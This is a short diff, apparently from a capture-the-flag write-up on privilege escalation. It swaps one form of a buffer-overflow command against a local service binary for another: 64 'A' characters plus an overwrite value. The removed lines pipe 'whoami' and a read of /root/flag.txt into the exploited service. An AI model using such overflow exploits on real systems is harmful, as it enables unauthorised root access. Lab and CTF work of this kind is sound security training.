@@ -1,7 +1,3 @@
 Privilege escalation
-(cat <<EOF
-whoami
-cat /root/flag.txt
-EOF
-) | /home/user/service $(python3 -c "print('A'*64 + '22222222')")
+python3 -c "import os, pty; pty.spawn(['/home/user/service', 'A'*64 + '22222222'])"
 
